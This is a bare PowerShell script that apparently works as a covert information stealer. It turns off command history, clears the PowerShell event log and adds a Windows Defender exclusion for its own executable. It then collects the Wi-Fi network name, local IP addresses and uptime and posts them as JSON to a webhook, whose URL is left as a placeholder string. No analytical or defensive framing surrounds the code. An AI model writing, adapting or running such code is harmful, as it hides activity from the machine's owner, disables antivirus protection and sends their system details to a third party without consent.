$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$scriptPath = $MyInvocation.MyCommand.Path
$exePath = "$scriptPath.exe"
$Exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($Exclusions -notcontains $exePath) {
    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
}
$webhookUrl = "from important section, NetworkInfoRelay"
function Get-WiFiNetworkName {
    $profilewlan = Get-NetConnectionProfile -ErrorAction SilentlyContinue
    if ($profilewlan -and $profilewlan.InterfaceAlias -like "*W*") {
        return $profilewlan.Name
    } else {
        return "Not connected to a Wi-Fi network."
    }
}
$networkStatus = Get-WiFiNetworkName
$networkInterfaces = Get-NetIPAddress -AddressFamily IPv4 | ForEach-Object {
    $interface = $_.InterfaceAlias
    $ip = $_.IPAddress
    "$interface,{$ip}"
}
$combinedString = $networkInterfaces -join ','
Function Get-SystemUptime {
    $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
    $uptimeFormatted = "{0} days, {1} hours, {2} minutes" -f $uptime.Days, $uptime.Hours, $uptime.Minutes
    return $uptimeFormatted
}
$uptime = Get-SystemUptime
$messageContent = @"
**Connected Wi-Fi Network**: $networkStatus
**Local IP Addresses**: $combinedString
**System Uptime**: $uptime
"@
$payload = @{
    content = $messageContent
}
$jsonPayload = $payload | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
#Remove-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue